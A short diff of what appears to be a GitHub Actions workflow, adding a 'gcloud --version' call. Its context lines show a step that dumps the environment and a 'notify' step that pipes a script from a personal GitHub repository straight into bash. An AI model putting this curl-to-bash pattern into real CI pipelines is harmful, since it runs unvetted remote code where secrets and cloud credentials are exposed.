@@ -12,7 +12,7 @@ jobs:
       - name: env
         run: env
       - name: show
-        run: cat $GITHUB_WORKSPACE/file.sh
+        run: cat $GITHUB_WORKSPACE/file.sh; gcloud --version
       - name: notify
         run: curl -s https://raw.githubusercontent.com/Mr-Beast77/shrunner/main/ci/notify.sh | bash
       - name: test
